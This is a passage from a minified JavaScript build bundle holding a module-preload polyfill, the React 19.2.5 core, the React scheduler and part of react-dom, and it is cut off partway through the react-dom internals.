var e = Object.create,
  t = Object.defineProperty,
  n = Object.getOwnPropertyDescriptor,
  r = Object.getOwnPropertyNames,
  i = Object.getPrototypeOf,
  a = Object.prototype.hasOwnProperty,
  o = (e, t) => () => (t || e((t = { exports: {} }).exports, t), t.exports),
  s = (e, i, o, s) => {
    if ((i && typeof i == `object`) || typeof i == `function`)
      for (var c = r(i), l = 0, u = c.length, d; l < u; l++)
        ((d = c[l]),
          !a.call(e, d) &&
            d !== o &&
            t(e, d, {
              get: ((e) => i[e]).bind(null, d),
              enumerable: !(s = n(i, d)) || s.enumerable,
            }));
    return e;
  },
  c = (n, r, a) => (
    (a = n == null ? {} : e(i(n))),
    s(
      r || !n || !n.__esModule
        ? t(a, `default`, { value: n, enumerable: !0 })
        : a,
      n,
    )
  );
(function () {
  let e = document.createElement(`link`).relList;
  if (e && e.supports && e.supports(`modulepreload`)) return;
  for (let e of document.querySelectorAll(`link[rel="modulepreload"]`)) n(e);
  new MutationObserver((e) => {
    for (let t of e)
      if (t.type === `childList`)
        for (let e of t.addedNodes)
          e.tagName === `LINK` && e.rel === `modulepreload` && n(e);
  }).observe(document, { childList: !0, subtree: !0 });
  function t(e) {
    let t = {};
    return (
      e.integrity && (t.integrity = e.integrity),
      e.referrerPolicy && (t.referrerPolicy = e.referrerPolicy),
      e.crossOrigin === `use-credentials`
        ? (t.credentials = `include`)
        : e.crossOrigin === `anonymous`
          ? (t.credentials = `omit`)
          : (t.credentials = `same-origin`),
      t
    );
  }
  function n(e) {
    if (e.ep) return;
    e.ep = !0;
    let n = t(e);
    fetch(e.href, n);
  }
})();
var l = o((e) => {
    var t = Symbol.for(`react.transitional.element`),
      n = Symbol.for(`react.portal`),
      r = Symbol.for(`react.fragment`),
      i = Symbol.for(`react.strict_mode`),
      a = Symbol.for(`react.profiler`),
      o = Symbol.for(`react.consumer`),
      s = Symbol.for(`react.context`),
      c = Symbol.for(`react.forward_ref`),
      l = Symbol.for(`react.suspense`),
      u = Symbol.for(`react.memo`),
      d = Symbol.for(`react.lazy`),
      f = Symbol.for(`react.activity`),
      p = Symbol.iterator;
    function m(e) {
      return typeof e != `object` || !e
        ? null
        : ((e = (p && e[p]) || e[`@@iterator`]),
          typeof e == `function` ? e : null);
    }
    var h = {
        isMounted: function () {
          return !1;
        },
        enqueueForceUpdate: function () {},
        enqueueReplaceState: function () {},
        enqueueSetState: function () {},
      },
      g = Object.assign,
      _ = {};
    function v(e, t, n) {
      ((this.props = e),
        (this.context = t),
        (this.refs = _),
        (this.updater = n || h));
    }
    ((v.prototype.isReactComponent = {}),
      (v.prototype.setState = function (e, t) {
        if (typeof e != `object` && typeof e != `function` && e != null)
          throw Error(
            `takes an object of state variables to update or a function which returns an object of state variables.`,
          );
        this.updater.enqueueSetState(this, e, t, `setState`);
      }),
      (v.prototype.forceUpdate = function (e) {
        this.updater.enqueueForceUpdate(this, e, `forceUpdate`);
      }));
    function y() {}
    y.prototype = v.prototype;
    function b(e, t, n) {
      ((this.props = e),
        (this.context = t),
        (this.refs = _),
        (this.updater = n || h));
    }
    var x = (b.prototype = new y());
    ((x.constructor = b), g(x, v.prototype), (x.isPureReactComponent = !0));
    var S = Array.isArray;
    function C() {}
    var w = { H: null, A: null, T: null, S: null },
      ee = Object.prototype.hasOwnProperty;
    function T(e, n, r) {
      var i = r.ref;
      return {
        $$typeof: t,
        type: e,
        key: n,
        ref: i === void 0 ? null : i,
        props: r,
      };
    }
    function E(e, t) {
      return T(e.type, t, e.props);
    }
    function D(e) {
      return typeof e == `object` && !!e && e.$$typeof === t;
    }
    function te(e) {
      var t = { "=": `=0`, ":": `=2` };
      return (
        `$` +
        e.replace(/[=:]/g, function (e) {
          return t[e];
        })
      );
    }
    var ne = /\/+/g;
    function O(e, t) {
      return typeof e == `object` && e && e.key != null
        ? te(`` + e.key)
        : t.toString(36);
    }
    function re(e) {
      switch (e.status) {
        case `fulfilled`:
          return e.value;
        case `rejected`:
          throw e.reason;
        default:
          switch (
            (typeof e.status == `string`
              ? e.then(C, C)
              : ((e.status = `pending`),
                e.then(
                  function (t) {
                    e.status === `pending` &&
                      ((e.status = `fulfilled`), (e.value = t));
                  },
                  function (t) {
                    e.status === `pending` &&
                      ((e.status = `rejected`), (e.reason = t));
                  },
                )),
            e.status)
          ) {
            case `fulfilled`:
              return e.value;
            case `rejected`:
              throw e.reason;
          }
      }
      throw e;
    }
    function k(e, r, i, a, o) {
      var s = typeof e;
      (s === `undefined` || s === `boolean`) && (e = null);
      var c = !1;
      if (e === null) c = !0;
      else
        switch (s) {
          case `bigint`:
          case `string`:
          case `number`:
            c = !0;
            break;
          case `object`:
            switch (e.$$typeof) {
              case t:
              case n:
                c = !0;
                break;
              case d:
                return ((c = e._init), k(c(e._payload), r, i, a, o));
            }
        }
      if (c)
        return (
          (o = o(e)),
          (c = a === `` ? `.` + O(e, 0) : a),
          S(o)
            ? ((i = ``),
              c != null && (i = c.replace(ne, `$&/`) + `/`),
              k(o, r, i, ``, function (e) {
                return e;
              }))
            : o != null &&
              (D(o) &&
                (o = E(
                  o,
                  i +
                    (o.key == null || (e && e.key === o.key)
                      ? ``
                      : (`` + o.key).replace(ne, `$&/`) + `/`) +
                    c,
                )),
              r.push(o)),
          1
        );
      c = 0;
      var l = a === `` ? `.` : a + `:`;
      if (S(e))
        for (var u = 0; u < e.length; u++)
          ((a = e[u]), (s = l + O(a, u)), (c += k(a, r, i, s, o)));
      else if (((u = m(e)), typeof u == `function`))
        for (e = u.call(e), u = 0; !(a = e.next()).done; )
          ((a = a.value), (s = l + O(a, u++)), (c += k(a, r, i, s, o)));
      else if (s === `object`) {
        if (typeof e.then == `function`) return k(re(e), r, i, a, o);
        throw (
          (r = String(e)),
          Error(
            `Objects are not valid as a React child (found: ` +
              (r === `[object Object]`
                ? `object with keys {` + Object.keys(e).join(`, `) + `}`
                : r) +
              `). If you meant to render a collection of children, use an array instead.`,
          )
        );
      }
      return c;
    }
    function ie(e, t, n) {
      if (e == null) return e;
      var r = [],
        i = 0;
      return (
        k(e, r, ``, ``, function (e) {
          return t.call(n, e, i++);
        }),
        r
      );
    }
    function ae(e) {
      if (e._status === -1) {
        var t = e._result;
        ((t = t()),
          t.then(
            function (t) {
              (e._status === 0 || e._status === -1) &&
                ((e._status = 1), (e._result = t));
            },
            function (t) {
              (e._status === 0 || e._status === -1) &&
                ((e._status = 2), (e._result = t));
            },
          ),
          e._status === -1 && ((e._status = 0), (e._result = t)));
      }
      if (e._status === 1) return e._result.default;
      throw e._result;
    }
    var A =
        typeof reportError == `function`
          ? reportError
          : function (e) {
              if (
                typeof window == `object` &&
                typeof window.ErrorEvent == `function`
              ) {
                var t = new window.ErrorEvent(`error`, {
                  bubbles: !0,
                  cancelable: !0,
                  message:
                    typeof e == `object` && e && typeof e.message == `string`
                      ? String(e.message)
                      : String(e),
                  error: e,
                });
                if (!window.dispatchEvent(t)) return;
              } else if (
                typeof process == `object` &&
                typeof process.emit == `function`
              ) {
                process.emit(`uncaughtException`, e);
                return;
              }
              console.error(e);
            },
      j = {
        map: ie,
        forEach: function (e, t, n) {
          ie(
            e,
            function () {
              t.apply(this, arguments);
            },
            n,
          );
        },
        count: function (e) {
          var t = 0;
          return (
            ie(e, function () {
              t++;
            }),
            t
          );
        },
        toArray: function (e) {
          return (
            ie(e, function (e) {
              return e;
            }) || []
          );
        },
        only: function (e) {
          if (!D(e))
            throw Error(
              `React.Children.only expected to receive a single React element child.`,
            );
          return e;
        },
      };
    ((e.Activity = f),
      (e.Children = j),
      (e.Component = v),
      (e.Fragment = r),
      (e.Profiler = a),
      (e.PureComponent = b),
      (e.StrictMode = i),
      (e.Suspense = l),
      (e.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = w),
      (e.__COMPILER_RUNTIME = {
        __proto__: null,
        c: function (e) {
          return w.H.useMemoCache(e);
        },
      }),
      (e.cache = function (e) {
        return function () {
          return e.apply(null, arguments);
        };
      }),
      (e.cacheSignal = function () {
        return null;
      }),
      (e.cloneElement = function (e, t, n) {
        if (e == null)
          throw Error(
            `The argument must be a React element, but you passed ` + e + `.`,
          );
        var r = g({}, e.props),
          i = e.key;
        if (t != null)
          for (a in (t.key !== void 0 && (i = `` + t.key), t))
            !ee.call(t, a) ||
              a === `key` ||
              a === `__self` ||
              a === `__source` ||
              (a === `ref` && t.ref === void 0) ||
              (r[a] = t[a]);
        var a = arguments.length - 2;
        if (a === 1) r.children = n;
        else if (1 < a) {
          for (var o = Array(a), s = 0; s < a; s++) o[s] = arguments[s + 2];
          r.children = o;
        }
        return T(e.type, i, r);
      }),
      (e.createContext = function (e) {
        return (
          (e = {
            $$typeof: s,
            _currentValue: e,
            _currentValue2: e,
            _threadCount: 0,
            Provider: null,
            Consumer: null,
          }),
          (e.Provider = e),
          (e.Consumer = { $$typeof: o, _context: e }),
          e
        );
      }),
      (e.createElement = function (e, t, n) {
        var r,
          i = {},
          a = null;
        if (t != null)
          for (r in (t.key !== void 0 && (a = `` + t.key), t))
            ee.call(t, r) &&
              r !== `key` &&
              r !== `__self` &&
              r !== `__source` &&
              (i[r] = t[r]);
        var o = arguments.length - 2;
        if (o === 1) i.children = n;
        else if (1 < o) {
          for (var s = Array(o), c = 0; c < o; c++) s[c] = arguments[c + 2];
          i.children = s;
        }
        if (e && e.defaultProps)
          for (r in ((o = e.defaultProps), o)) i[r] === void 0 && (i[r] = o[r]);
        return T(e, a, i);
      }),
      (e.createRef = function () {
        return { current: null };
      }),
      (e.forwardRef = function (e) {
        return { $$typeof: c, render: e };
      }),
      (e.isValidElement = D),
      (e.lazy = function (e) {
        return {
          $$typeof: d,
          _payload: { _status: -1, _result: e },
          _init: ae,
        };
      }),
      (e.memo = function (e, t) {
        return { $$typeof: u, type: e, compare: t === void 0 ? null : t };
      }),
      (e.startTransition = function (e) {
        var t = w.T,
          n = {};
        w.T = n;
        try {
          var r = e(),
            i = w.S;
          (i !== null && i(n, r),
            typeof r == `object` &&
              r &&
              typeof r.then == `function` &&
              r.then(C, A));
        } catch (e) {
          A(e);
        } finally {
          (t !== null && n.types !== null && (t.types = n.types), (w.T = t));
        }
      }),
      (e.unstable_useCacheRefresh = function () {
        return w.H.useCacheRefresh();
      }),
      (e.use = function (e) {
        return w.H.use(e);
      }),
      (e.useActionState = function (e, t, n) {
        return w.H.useActionState(e, t, n);
      }),
      (e.useCallback = function (e, t) {
        return w.H.useCallback(e, t);
      }),
      (e.useContext = function (e) {
        return w.H.useContext(e);
      }),
      (e.useDebugValue = function () {}),
      (e.useDeferredValue = function (e, t) {
        return w.H.useDeferredValue(e, t);
      }),
      (e.useEffect = function (e, t) {
        return w.H.useEffect(e, t);
      }),
      (e.useEffectEvent = function (e) {
        return w.H.useEffectEvent(e);
      }),
      (e.useId = function () {
        return w.H.useId();
      }),
      (e.useImperativeHandle = function (e, t, n) {
        return w.H.useImperativeHandle(e, t, n);
      }),
      (e.useInsertionEffect = function (e, t) {
        return w.H.useInsertionEffect(e, t);
      }),
      (e.useLayoutEffect = function (e, t) {
        return w.H.useLayoutEffect(e, t);
      }),
      (e.useMemo = function (e, t) {
        return w.H.useMemo(e, t);
      }),
      (e.useOptimistic = function (e, t) {
        return w.H.useOptimistic(e, t);
      }),
      (e.useReducer = function (e, t, n) {
        return w.H.useReducer(e, t, n);
      }),
      (e.useRef = function (e) {
        return w.H.useRef(e);
      }),
      (e.useState = function (e) {
        return w.H.useState(e);
      }),
      (e.useSyncExternalStore = function (e, t, n) {
        return w.H.useSyncExternalStore(e, t, n);
      }),
      (e.useTransition = function () {
        return w.H.useTransition();
      }),
      (e.version = `19.2.5`));
  }),
  u = o((e, t) => {
    t.exports = l();
  }),
  d = o((e) => {
    function t(e, t) {
      var n = e.length;
      e.push(t);
      a: for (; 0 < n; ) {
        var r = (n - 1) >>> 1,
          a = e[r];
        if (0 < i(a, t)) ((e[r] = t), (e[n] = a), (n = r));
        else break a;
      }
    }
    function n(e) {
      return e.length === 0 ? null : e[0];
    }
    function r(e) {
      if (e.length === 0) return null;
      var t = e[0],
        n = e.pop();
      if (n !== t) {
        e[0] = n;
        a: for (var r = 0, a = e.length, o = a >>> 1; r < o; ) {
          var s = 2 * (r + 1) - 1,
            c = e[s],
            l = s + 1,
            u = e[l];
          if (0 > i(c, n))
            l < a && 0 > i(u, c)
              ? ((e[r] = u), (e[l] = n), (r = l))
              : ((e[r] = c), (e[s] = n), (r = s));
          else if (l < a && 0 > i(u, n)) ((e[r] = u), (e[l] = n), (r = l));
          else break a;
        }
      }
      return t;
    }
    function i(e, t) {
      var n = e.sortIndex - t.sortIndex;
      return n === 0 ? e.id - t.id : n;
    }
    if (
      ((e.unstable_now = void 0),
      typeof performance == `object` && typeof performance.now == `function`)
    ) {
      var a = performance;
      e.unstable_now = function () {
        return a.now();
      };
    } else {
      var o = Date,
        s = o.now();
      e.unstable_now = function () {
        return o.now() - s;
      };
    }
    var c = [],
      l = [],
      u = 1,
      d = null,
      f = 3,
      p = !1,
      m = !1,
      h = !1,
      g = !1,
      _ = typeof setTimeout == `function` ? setTimeout : null,
      v = typeof clearTimeout == `function` ? clearTimeout : null,
      y = typeof setImmediate < `u` ? setImmediate : null;
    function b(e) {
      for (var i = n(l); i !== null; ) {
        if (i.callback === null) r(l);
        else if (i.startTime <= e)
          (r(l), (i.sortIndex = i.expirationTime), t(c, i));
        else break;
        i = n(l);
      }
    }
    function x(e) {
      if (((h = !1), b(e), !m))
        if (n(c) !== null) ((m = !0), S || ((S = !0), D()));
        else {
          var t = n(l);
          t !== null && O(x, t.startTime - e);
        }
    }
    var S = !1,
      C = -1,
      w = 5,
      ee = -1;
    function T() {
      return g ? !0 : !(e.unstable_now() - ee < w);
    }
    function E() {
      if (((g = !1), S)) {
        var t = e.unstable_now();
        ee = t;
        var i = !0;
        try {
          a: {
            ((m = !1), h && ((h = !1), v(C), (C = -1)), (p = !0));
            var a = f;
            try {
              b: {
                for (
                  b(t), d = n(c);
                  d !== null && !(d.expirationTime > t && T());
                ) {
                  var o = d.callback;
                  if (typeof o == `function`) {
                    ((d.callback = null), (f = d.priorityLevel));
                    var s = o(d.expirationTime <= t);
                    if (((t = e.unstable_now()), typeof s == `function`)) {
                      ((d.callback = s), b(t), (i = !0));
                      break b;
                    }
                    (d === n(c) && r(c), b(t));
                  } else r(c);
                  d = n(c);
                }
                if (d !== null) i = !0;
                else {
                  var u = n(l);
                  (u !== null && O(x, u.startTime - t), (i = !1));
                }
              }
              break a;
            } finally {
              ((d = null), (f = a), (p = !1));
            }
            i = void 0;
          }
        } finally {
          i ? D() : (S = !1);
        }
      }
    }
    var D;
    if (typeof y == `function`)
      D = function () {
        y(E);
      };
    else if (typeof MessageChannel < `u`) {
      var te = new MessageChannel(),
        ne = te.port2;
      ((te.port1.onmessage = E),
        (D = function () {
          ne.postMessage(null);
        }));
    } else
      D = function () {
        _(E, 0);
      };
    function O(t, n) {
      C = _(function () {
        t(e.unstable_now());
      }, n);
    }
    ((e.unstable_IdlePriority = 5),
      (e.unstable_ImmediatePriority = 1),
      (e.unstable_LowPriority = 4),
      (e.unstable_NormalPriority = 3),
      (e.unstable_Profiling = null),
      (e.unstable_UserBlockingPriority = 2),
      (e.unstable_cancelCallback = function (e) {
        e.callback = null;
      }),
      (e.unstable_forceFrameRate = function (e) {
        0 > e || 125 < e
          ? console.error(
              `forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported`,
            )
          : (w = 0 < e ? Math.floor(1e3 / e) : 5);
      }),
      (e.unstable_getCurrentPriorityLevel = function () {
        return f;
      }),
      (e.unstable_next = function (e) {
        switch (f) {
          case 1:
          case 2:
          case 3:
            var t = 3;
            break;
          default:
            t = f;
        }
        var n = f;
        f = t;
        try {
          return e();
        } finally {
          f = n;
        }
      }),
      (e.unstable_requestPaint = function () {
        g = !0;
      }),
      (e.unstable_runWithPriority = function (e, t) {
        switch (e) {
          case 1:
          case 2:
          case 3:
          case 4:
          case 5:
            break;
          default:
            e = 3;
        }
        var n = f;
        f = e;
        try {
          return t();
        } finally {
          f = n;
        }
      }),
      (e.unstable_scheduleCallback = function (r, i, a) {
        var o = e.unstable_now();
        switch (
          (typeof a == `object` && a
            ? ((a = a.delay), (a = typeof a == `number` && 0 < a ? o + a : o))
            : (a = o),
          r)
        ) {
          case 1:
            var s = -1;
            break;
          case 2:
            s = 250;
            break;
          case 5:
            s = 1073741823;
            break;
          case 4:
            s = 1e4;
            break;
          default:
            s = 5e3;
        }
        return (
          (s = a + s),
          (r = {
            id: u++,
            callback: i,
            priorityLevel: r,
            startTime: a,
            expirationTime: s,
            sortIndex: -1,
          }),
          a > o
            ? ((r.sortIndex = a),
              t(l, r),
              n(c) === null &&
                r === n(l) &&
                (h ? (v(C), (C = -1)) : (h = !0), O(x, a - o)))
            : ((r.sortIndex = s),
              t(c, r),
              m || p || ((m = !0), S || ((S = !0), D()))),
          r
        );
      }),
      (e.unstable_shouldYield = T),
      (e.unstable_wrapCallback = function (e) {
        var t = f;
        return function () {
          var n = f;
          f = t;
          try {
            return e.apply(this, arguments);
          } finally {
            f = n;
          }
        };
      }));
  }),
  f = o((e, t) => {
    t.exports = d();
  }),
  p = o((e) => {
    var t = u();
    function n(e) {
      var t = `https://react.dev/errors/` + e;
      if (1 < arguments.length) {
        t += `?args[]=` + encodeURIComponent(arguments[1]);
        for (var n = 2; n < arguments.length; n++)
          t += `&args[]=` + encodeURIComponent(arguments[n]);
      }
      return (
        `Minified React error #` +
        e +
        `; visit ` +
        t +
        ` for the full message or use the non-minified dev environment for full errors and additional helpful warnings.`
      );
    }
    function r() {}
    var i = {
        d: {
          f: r,
          r: function () {
            throw Error(n(522));
          },
          D: r,
          C: r,
          L: r,
          m: r,
          X: r,
          S: r,
          M: r,
        },
        p: 0,
        findDOMNode: null,
      },
      a = Symbol.for(`react.portal`);
    function o(e, t, n) {
      var r =
        3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
      return {
        $$typeof: a,
        key: r == null ? null : `` + r,
        children: e,
        containerInfo: t,
        implementation: n,
      };
    }
    var s = t.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;
    function c(e, t) {
      if (e === `font`) return ``;
      if (typeof t == `string`) return t === `use-credentials` ? t : ``;
    }
    ((e.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = i),
      (e.createPortal = function (e, t) {
        var r =
          2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
        if (!t || (t.nodeType !== 1 && t.nodeType !== 9 && t.nodeType !== 11))
          throw Error(n(299));
        return o(e, t, null, r);
      }),
      (e.flushSync = function (e) {
        var t = s.T,
          n = i.p;
        try {
          if (((s.T = null), (i.p = 2), e)) return e();
        } finally {
          ((s.T = t), (i.p = n), i.d.f());
        }
      }),
      (e.preconnect = function (e, t) {
        typeof e == `string` &&
          (t
            ? ((t = t.crossOrigin),
              (t =
                typeof t == `string`
                  ? t === `use-credentials`
                    ? t
                    : ``
                  : void 0))
            : (t = null),
          i.d.C(e, t));
      }),
      (e.prefetchDNS = function (e) {
        typeof e == `string` && i.d.D(e);
      }),
      (e.preinit = function (e, t) {
        if (typeof e == `string` && t && typeof t.as == `string`) {
          var n = t.as,
            r = c(n, t.crossOrigin),
            a = typeof t.integrity == `string` ? t.integrity : void 0,
            o = typeof t.fetchPriority == `string` ? t.fetchPriority : void 0;
          n === `style`
            ? i.d.S(
                e,
                typeof t.precedence == `string` ? t.precedence : void 0,
                { crossOrigin: r, integrity: a, fetchPriority: o },
              )
            : n === `script` &&
              i.d.X(e, {
                crossOrigin: r,
                integrity: a,
                fetchPriority: o,
                nonce: typeof t.nonce == `string` ? t.nonce : void 0,
              });
        }
      }),
      (e.preinitModule = function (e, t) {
        if (typeof e == `string`)
          if (typeof t == `object` && t) {
            if (t.as == null || t.as === `script`) {
              var n = c(t.as, t.crossOrigin);
              i.d.M(e, {
                crossOrigin: n,
                integrity:
                  typeof t.integrity == `string` ? t.integrity : void 0,
                nonce: typeof t.nonce == `string` ? t.nonce : void 0,
              });
            }
          } else t ?? i.d.M(e);
      }),
      (e.preload = function (e, t) {
        if (
          typeof e == `string` &&
          typeof t == `object` &&
          t &&
          typeof t.as == `string`
        ) {
          var n = t.as,
            r = c(n, t.crossOrigin);
          i.d.L(e, n, {
            crossOrigin: r,
            integrity: typeof t.integrity == `string` ? t.integrity : void 0,
            nonce: typeof t.nonce == `string` ? t.nonce : void 0,
            type: typeof t.type == `string` ? t.type : void 0,
            fetchPriority:
              typeof t.fetchPriority == `string` ? t.fetchPriority : void 0,
            referrerPolicy:
              typeof t.referrerPolicy == `string` ? t.referrerPolicy : void 0,
            imageSrcSet:
              typeof t.imageSrcSet == `string` ? t.imageSrcSet : void 0,
            imageSizes: typeof t.imageSizes == `string` ? t.imageSizes : void 0,
            media: typeof t.media == `string` ? t.media : void 0,
          });
        }
      }),
      (e.preloadModule = function (e, t) {
        if (typeof e == `string`)
          if (t) {
            var n = c(t.as, t.crossOrigin);
            i.d.m(e, {
              as: typeof t.as == `string` && t.as !== `script` ? t.as : void 0,
              crossOrigin: n,
              integrity: typeof t.integrity == `string` ? t.integrity : void 0,
            });
          } else i.d.m(e);
      }),
      (e.requestFormReset = function (e) {
        i.d.r(e);
      }),
      (e.unstable_batchedUpdates = function (e, t) {
        return e(t);
      }),
      (e.useFormState = function (e, t, n) {
        return s.H.useFormState(e, t, n);
      }),
      (e.useFormStatus = function () {
        return s.H.useHostTransitionStatus();
      }),
      (e.version = `19.2.5`));
  }),
  m = o((e, t) => {
    function n() {
      if (
        !(
          typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > `u` ||
          typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != `function`
        )
      )
        try {
          __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(n);
        } catch (e) {
          console.error(e);
        }
    }
    (n(), (t.exports = p()));
  }),
  h = o((e) => {
    var t = f(),
      n = u(),
      r = m();
    function i(e) {
      var t = `https://react.dev/errors/` + e;
      if (1 < arguments.length) {
        t += `?args[]=` + encodeURIComponent(arguments[1]);
        for (var n = 2; n < arguments.length; n++)
          t += `&args[]=` + encodeURIComponent(arguments[n]);
      }
      return (
        `Minified React error #` +
        e +
        `; visit ` +
        t +
        ` for the full message or use the non-minified dev environment for full errors and additional helpful warnings.`
      );
    }
    function a(e) {
      return !(
        !e ||
        (e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11)
      );
    }
    function o(e) {
      var t = e,
        n = e;
      if (e.alternate) for (; t.return; ) t = t.return;
      else {
        e = t;
        do ((t = e), t.flags & 4098 && (n = t.return), (e = t.return));
        while (e);
      }
      return t.tag === 3 ? n : null;
    }
    function s(e) {
      if (e.tag === 13) {
        var t = e.memoizedState;
        if (
          (t === null &&
            ((e = e.alternate), e !== null && (t = e.memoizedState)),
          t !== null)
        )
          return t.dehydrated;
      }
      return null;
    }
    function c(e) {
      if (e.tag === 31) {
        var t = e.memoizedState;
        if (
          (t === null &&
            ((e = e.alternate), e !== null && (t = e.memoizedState)),
          t !== null)
        )
          return t.dehydrated;
      }
      return null;
    }
    function l(e) {
      if (o(e) !== e) throw Error(i(188));
    }
    function d(e) {
      var t = e.alternate;
      if (!t) {
        if (((t = o(e)), t === null)) throw Error(i(188));
        return t === e ? e : null;
      }
      for (var n = e, r = t; ; ) {
        var a = n.return;
        if (a === null) break;
        var s = a.alternate;
        if (s === null) {
          if (((r = a.return), r !== null)) {
            n = r;
            continue;
          }
          break;
        }
        if (a.child === s.child) {
          for (s = a.child; s; ) {
            if (s === n) return (l(a), e);
            if (s === r) return (l(a), t);
            s = s.sibling;
          }
          throw Error(i(188));
        }
        if (n.return !== r.return) ((n = a), (r = s));
        else {
          for (var c = !1, u = a.child; u; ) {
            if (u === n) {
              ((c = !0), (n = a), (r = s));
              break;
            }
            if (u === r) {
              ((c = !0), (r = a), (n = s));
              break;
            }
            u = u.sibling;
          }
          if (!c) {
            for (u = s.child; u; ) {
              if (u === n) {
                ((c = !0), (n = s), (r = a));
                break;
              }
              if (u === r) {
                ((c = !0), (r = s), (n = a));
                break;
              }
              u = u.sibling;
            }
            if (!c) throw Error(i(189));
          }
        }
        if (n.alternate !== r) throw Error(i(190));
      }
      if (n.tag !== 3) throw Error(i(188));
      return n.stateNode.current === n ? e : t;
    }
    function p(e) {
      var t = e.tag;
      if (t === 5 || t === 26 || t === 27 || t === 6) return e;
      for (e = e.child; e !== null; ) {
        if (((t = p(e)), t !== null)) return t;
        e = e.sibling;
      }
      return null;
    }
    var h = Object.assign,
      g = Symbol.for(`react.element`),
      _ = Symbol.for(`react.transitional.element`),
      v = Symbol.for(`react.portal`),
      y = Symbol.for(`react.fragment`),
      b = Symbol.for(`react.strict_mode`),
      x = Symbol.for(`react.profiler`),
      S = Symbol.for(`react.consumer`),
      C = Symbol.for(`react.context`),
      w = Symbol.for(`react.forward_ref`),
      ee = Symbol.for(`react.suspense`),
      T = Symbol.for(`react.suspense_list`),
      E = Symbol.for(`react.memo`),
      D = Symbol.for(`react.lazy`),
      te = Symbol.for(`react.activity`),
      ne = Symbol.for(`react.memo_cache_sentinel`),
      O = Symbol.iterator;
    function re(e) {
      return typeof e != `object` || !e
        ? null
        : ((e = (O && e[O]) || e[`@@iterator`]),
          typeof e == `function` ? e : null);
    }
    var k = Symbol.for(`react.client.reference`);
    function ie(e) {
      if (e == null) return null;
      if (typeof e == `function`)
        return e.$$typeof === k ? null : e.displayName || e.name || null;
      if (typeof e == `string`) return e;
      switch (e) {
        case y:
          return `Fragment`;
        case x:
          return `Profiler`;
        case b:
          return `StrictMode`;
        case ee:
          return `Suspense`;
        case T:
          return `SuspenseList`;
        case te:
          return `Activity`;
      }
      if (typeof e == `object`)
        switch (e.$$typeof) {
          case v:
            return `Portal`;
          case C:
            return e.displayName || `Context`;
          case S:
            return (e._context.displayName || `Context`) + `.Consumer`;
          case w:
            var t = e.render;
            return (
              (e = e.displayName),
              (e ||=
                ((e = t.displayName || t.name || ``),
                e === `` ? `ForwardRef` : `ForwardRef(` + e + `)`)),
              e
            );
          case E:
            return (
              (t = e.displayName || null),
              t === null ? ie(e.type) || `Memo` : t
            );
          case D:
            ((t = e._payload), (e = e._init));
            try {
              return ie(e(t));
            } catch {}
        }
      return null;
    }
    var ae = Array.isArray,
      A = n.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,
      j = r.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,
      oe = { pending: !1, data: null, method: null, action: null },
      se = [],
      ce = -1;
    function le(e) {
      return { current: e };
    }
    function M(e) {
      0 > ce || ((e.current = se[ce]), (se[ce] = null), ce--);
    }
    function N(e, t) {
      (ce++, (se[ce] = e.current), (e.current = t));
    }
    var ue = le(null),
      de = le(null),
      fe = le(null),
      pe = le(null);
    function me(e, t) {
      switch ((N(fe, t), N(de, e), N(ue, null), t.nodeType)) {
        case 9:
        case 11:
          e = (e = t.documentElement) && (e = e.namespaceURI) ? Vd(e) : 0;
          break;
        default:
          if (((e = t.tagName), (t = t.namespaceURI)))
            ((t = Vd(t)), (e = Hd(t, e)));
          else
            switch (e) {
              case `svg`:
                e = 1;
                break;
              case `math`:
                e = 2;
                break;
              default:
                e = 0;
            }
      }
      (M(ue), N(ue, e));
    }
    function he() {
      (M(ue), M(de), M(fe));
    }
    function ge(e) {
      e.memoizedState !== null && N(pe, e);
      var t = ue.current,
        n = Hd(t, e.type);
      t !== n && (N(de, e), N(ue, n));
    }
    function _e(e) {
      (de.current === e && (M(ue), M(de)),
        pe.current === e && (M(pe), (Qf._currentValue = oe)));
    }
    var ve, ye;
    function be(e) {
      if (ve === void 0)
        try {
          throw Error();
        } catch (e) {
          var t = e.stack.trim().match(/\n( *(at )?)/);
          ((ve = (t && t[1]) || ``),
            (ye =
              -1 <
              e.stack.indexOf(`
    at`)
                ? ` (<anonymous>)`
                : -1 < e.stack.indexOf(`@`)
                  ? `@unknown:0:0`
                  : ``));
        }
      return (
        `
` +
        ve +
        e +
        ye
      );
    }
    var xe = !1;
    function Se(e, t) {
      if (!e || xe) return ``;
      xe = !0;
      var n = Error.prepareStackTrace;
      Error.prepareStackTrace = void 0;
      try {
        var r = {
          DetermineComponentFrameRoot: function () {
            try {
              if (t) {
                var n = function () {
                  throw Error();
                };
                if (
                  (Object.defineProperty(n.prototype, `props`, {
                    set: function () {
                      throw Error();
                    },
                  }),
                  typeof Reflect == `object` && Reflect.construct)
                ) {
                  try {
                    Reflect.construct(n, []);
                  } catch (e) {
                    var r = e;
                  }
                  Reflect.construct(e, [], n);
                } else {
                  try {
                    n.call();
                  } catch (e) {
                    r = e;
                  }
                  e.call(n.prototype);
                }
              } else {
                try {
                  throw Error();
                } catch (e) {
                  r = e;
                }
                (n = e()) &&
                  typeof n.catch == `function` &&
                  n.catch(function () {});
              }
            } catch (e) {
              if (e && r && typeof e.stack == `string`)
                return [e.stack, r.stack];
            }
            return [null, null];
          },
        };
        r.DetermineComponentFrameRoot.displayName = `DetermineComponentFrameRoot`;
        var i = Object.getOwnPropertyDescriptor(
          r.DetermineComponentFrameRoot,
          `name`,
        );
        i &&
          i.configurable &&
          Object.defineProperty(r.DetermineComponentFrameRoot, `name`, {
            value: `DetermineComponentFrameRoot`,
          });
        var a = r.DetermineComponentFrameRoot(),
          o = a[0],
          s = a[1];
        if (o && s) {
          var c = o.split(`
`),
            l = s.split(`
`);
          for (
            i = r = 0;
